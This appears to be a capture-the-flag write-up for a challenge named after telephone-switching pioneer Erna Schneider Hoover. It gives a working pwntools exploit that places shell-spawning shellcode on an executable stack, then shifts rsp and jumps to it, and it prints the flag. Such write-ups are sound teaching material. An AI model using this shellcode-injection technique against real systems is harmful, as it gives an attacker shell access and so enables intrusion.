# Erna Schneider Hoover 

## Prompt

[Erna Schneider Hoover](https://en.wikipedia.org/wiki/Erna_Schneider_Hoover) (born June 19, 1926) is an American mathematician notable for inventing a computerized telephone switching method which "revolutionized modern communication". It prevented system overloads by monitoring call center traffic and prioritizing tasks on phone switching systems to enable more robust service during peak calling times. At Bell Laboratories where she worked for over 32 years, Hoover was described as an important pioneer for women in the field of computer technology. - [Wikipedia Entry](https://en.wikipedia.org/wiki/Erna_Schneider_Hoover)


Chal: Get your best shellcode going for this [inventor who developed the system for handling telephone traffic overload](https://ncwit.org/article/2023-pioneer-in-tech-award-recipient-erna-schneider-hoover/).

## Solution

You can store your shellcode on the stack since its compiled with ``-z execstack``. Its 120 bytes from ``$rsp`` when your first stage shellcode starts. So just adjust rsp manually and jump into your shellcode

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
break *0x0000000000401227
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io',28184)
    else:
        return process(e.path)

p = start()
p.sendline(asm(shellcraft.sh()))
pause()
p.sendline(asm('nop;nop;add rsp,120; jmp rsp; ;nop'))
p.interactive()
``` 

chctf{r3volutioniz3d_moD3rn_coMMunicat10ns}

